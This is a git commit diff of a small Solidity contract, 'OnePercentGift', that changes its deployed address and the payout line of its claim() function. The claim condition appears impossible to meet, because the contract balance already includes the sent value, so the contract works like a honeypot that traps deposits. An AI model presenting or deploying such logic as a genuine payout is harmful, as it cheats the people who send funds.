f7b18d66acb27ec6cb6b6dcc8b043d5479f6372d
Ngoc Bui Dinh <buidinhngoc.aiti@gmail.com>
2018-10-16 21:08:02 +0700

    add contract OnePercentGift

--- OnePercentGift.sol
+++ OnePercentGift.sol
@@ -1,5 +1,5 @@
 /* 
- source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OnePercentGift at 0xb0d9473a71dfafc80df8de7f45a012ef5b33c6fd
+ source code generate by Bui Dinh Ngoc aka ngocbd<buidinhngoc.aiti@gmail.com> for smartcontract OnePercentGift at 0x094a7d5a89b4215334f2658841986ea3702ae615
 */
 pragma solidity ^0.4.21;
 
@@ -12,12 +12,12 @@ contract OnePercentGift{
 	}
 
 	function refillGift() payable public{
-        
+
 	}
 
 	function claim() payable public{
 		if(msg.value == address(this).balance * 100){
-			msg.sender.transfer(msg.value + address(this).balance);
+			msg.sender.transfer(msg.value * 101);
 		}
 	}
 
